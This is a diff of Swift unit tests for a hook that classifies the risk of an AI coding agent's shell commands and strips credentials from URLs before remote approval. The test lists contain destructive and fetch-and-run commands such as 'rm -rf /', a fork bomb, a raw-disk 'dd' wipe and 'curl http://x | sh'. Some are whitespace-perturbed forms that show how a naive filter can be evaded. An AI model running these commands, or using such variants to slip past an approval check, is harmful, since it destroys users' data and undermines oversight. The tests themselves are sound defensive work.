@@ -174,10 +174,95 @@ final class HookAdapterTests: XCTestCase {
         )
     }
 
-    func testTryLocalUdsHookNoEnvReturnsNil() {
-        // Missing CLI_PULSE_LOCAL_* env → not a managed session → tryLocalUdsHook
-        // returns nil. M1: run() then fails OPEN (external — defers to Claude's
-        // own prompt via "ask"/abstain, never auto-approves), NOT a hard deny.
+    // MARK: - token-level high-risk classifier (review: codex P1)
+    // The old substring scanner missed whitespace-perturbed / split-flag forms;
+    // those reached the remote-approval plane as `medium` where a remote allow
+    // could run a destructive command. Ports Python `_is_high_risk_bash`.
+
+    func testHighRiskWhitespacePerturbedAndSplitFlags() {
+        let high = [
+            "rm -rf /", "rm -fr /tmp/x", "rm  -rf /",   // double space
+            "rm -r -f /", "rm -r --force /",             // split flags
+            "rm\t-rf /",                                  // tab
+            "sudo\trm foo", "sudo apt install x",        // sudo (tab + space)
+            "dd if=/dev/zero of=/dev/disk0",             // dd + if=
+            ":(){ :|:& };:",                             // fork bomb
+            "chmod 777 /", "history -c",
+            "curl http://x | sh", "wget http://x",
+        ]
+        for cmd in high {
+            XCTAssertEqual(HookAdapter.classifyRisk(toolName: "Bash", toolInput: ["command": cmd]),
+                           "high", "must classify high: \(cmd)")
+        }
+    }
+
+    func testHighRiskNoFalsePositivesOnLookalikes() {
+        let medium = [
+            "sudoer-config-tool --check",   // not the `sudo` token
+            "forecast-curl-stats",          // not the `curl` token
+            "rm file.txt",                  // rm without destructive flags
+            "dd bs=1M count=1",             // dd without if=
+        ]
+        for cmd in medium {
+            XCTAssertEqual(HookAdapter.classifyRisk(toolName: "Bash", toolInput: ["command": cmd]),
+                           "medium", "must NOT false-positive: \(cmd)")
+        }
+    }
+
+    // MARK: - URL credential sanitization (review: codex P1, audit F7)
+
+    func testSanitizeURLStripsUserinfoQueryFragment() {
+        XCTAssertEqual(
+            HookAdapter.sanitizeURL("https://user:pass@host.example.com:8443/path?code=secret#frag"),
+            "https://host.example.com:8443/path")
+        // Non-URL passes through unchanged (WebSearch query text).
+        XCTAssertEqual(HookAdapter.sanitizeURL("how do I reset my password"),
+                       "how do I reset my password")
+        // mailto (no // authority) is left alone — matches Python urlsplit's
+        // empty-netloc passthrough.
+        XCTAssertEqual(HookAdapter.sanitizeURL("mailto:a@b.com"), "mailto:a@b.com")
+    }
+
+    func testSanitizeURLMalformedAuthorityStillStripsCreds() {
+        // Empty-host authority (review: codex) — creds MUST still be stripped,
+        // matching Python urlsplit → https:///path.
+        XCTAssertEqual(
+            HookAdapter.sanitizeURL("https://alice:password@/path?token=plaincredential"),
+            "https:///path")
+    }
+
+    func testSanitizeURLPreservesPercentEncodingAndIPv6() {
+        // %2F preserved (Python parity — comps.path would re-decode it).
+        XCTAssertEqual(HookAdapter.sanitizeURL("https://host/a%2Fb/c?x=1"),
+                       "https://host/a%2Fb/c")
+        // IPv6 brackets kept (valid URL syntax).
+        XCTAssertEqual(HookAdapter.sanitizeURL("http://[2001:db8::1]:8080/x?t=secret"),
+                       "http://[2001:db8::1]:8080/x")
+    }
+
+    func testHighRiskCarriageReturnPerturbed() {
+        // Python str.split() tokenizes on ALL whitespace incl CR — Swift must
+        // too (review: codex), else `sudo\r rm` evades the classifier.
+        XCTAssertEqual(
+            HookAdapter.classifyRisk(toolName: "Bash", toolInput: ["command": "sudo\r-v"]),
+            "high")
+    }
+
+    func testWebFetchSummaryAndPayloadStripCredentials() {
+        let raw = "https://u:p@api.example.com/x?token=sk-SUPERSECRETVALUE1234"
+        let summary = HookAdapter.summaryFor(toolName: "WebFetch", toolInput: ["url": raw])
+        XCTAssertFalse(summary.contains("SUPERSECRET"), summary)
+        XCTAssertFalse(summary.contains("u:p@"), summary)
+        let payload = HookAdapter.redactedToolInput(["url": raw])
+        let url = payload["url"] as? String ?? ""
+        XCTAssertFalse(url.contains("SUPERSECRET"), url)
+        XCTAssertFalse(url.contains("token="), url)
+    }
+
+    func testTryLocalUdsHookNoEnvReturnsNotAttempted() {
+        // Missing CLI_PULSE_LOCAL_* env → not a managed session → .notAttempted
+        // so run() takes the external path (remote arm → else fail OPEN via
+        // "ask"/abstain — never auto-approves, never a hard deny).
         let parsed = HookAdapter.ClaudeHookInput(
             toolName: "Bash",
             toolInput: [:],
@@ -186,9 +271,9 @@ final class HookAdapterTests: XCTestCase {
             risk: "medium",
             eventName: "PermissionRequest"
         )
-        let outcome = HookAdapter.tryLocalUdsHook(parsed: parsed)
-        XCTAssertNil(outcome,
-                     "missing env vars must return nil so run() takes the external path")
+        guard case .notAttempted = HookAdapter.tryLocalUdsHook(parsed: parsed) else {
+            return XCTFail("missing env vars must return .notAttempted so run() takes the external path")
+        }
     }
 
     // MARK: - Codex P1.B redaction
@@ -251,11 +336,15 @@ final class HookAdapterTests: XCTestCase {
 
     /// The `run()` function emits a JSON decision to stdout. We
     /// can't easily capture stdout in a unit test without a fork,
-    /// but we CAN pin the in-memory Decision branches by checking
-    /// `tryLocalUdsHook(parsed:)` returns:
-    ///   * nil when env vars missing (run emits allow)
-    ///   * Decision(deny) when env vars present but UDS broken
-    func testTryLocalUdsHookDenyWhenManagedSessionButSocketMissing() {
+    /// but we CAN pin the in-memory outcome branches.
+    ///
+    /// Remote-arm port: a managed session whose local helper socket is GONE is
+    /// a PRE-create failure → `.notAttempted` (Python parity: `_try_local_uds_hook`
+    /// returns None at exactly these sites so the REMOTE arm can still resolve
+    /// the approval — the phone approves while the local helper is down). If
+    /// the remote arm also fails, the shared `.fallback` resolves managed →
+    /// fail-closed deny; a broken helper still NEVER auto-approves.
+    func testTryLocalUdsHookSocketMissingFallsThroughToRemoteArm() {
         // Set env vars to a guaranteed-missing socket path.
         let bogusSocket = "/tmp/clipulse-helper-does-not-exist-\(UUID().uuidString).sock"
         setenv("CLI_PULSE_LOCAL_HELPER_SOCK", bogusSocket, 1)
@@ -274,16 +363,9 @@ final class HookAdapterTests: XCTestCase {
             risk: "medium",
             eventName: "PermissionRequest"
         )
-        let outcome = HookAdapter.tryLocalUdsHook(parsed: parsed)
-        guard let decision = outcome else {
-            XCTFail("env vars present but socket missing → must return Decision(deny), not nil")
-            return
+        guard case .notAttempted = HookAdapter.tryLocalUdsHook(parsed: parsed) else {
+            return XCTFail("managed + socket missing is a PRE-create failure → .notAttempted (remote arm runs)")
         }
-        XCTAssertEqual(decision.behavior, .deny,
-                       "managed session with broken helper must fail CLOSED")
-        XCTAssertNotNil(decision.message)
-        XCTAssertTrue((decision.message ?? "").contains("CLI Pulse helper"),
-                      "deny message must explain the helper is unreachable")
     }
 
     // MARK: - M1: event detection + PreToolUse shape + external fail-open
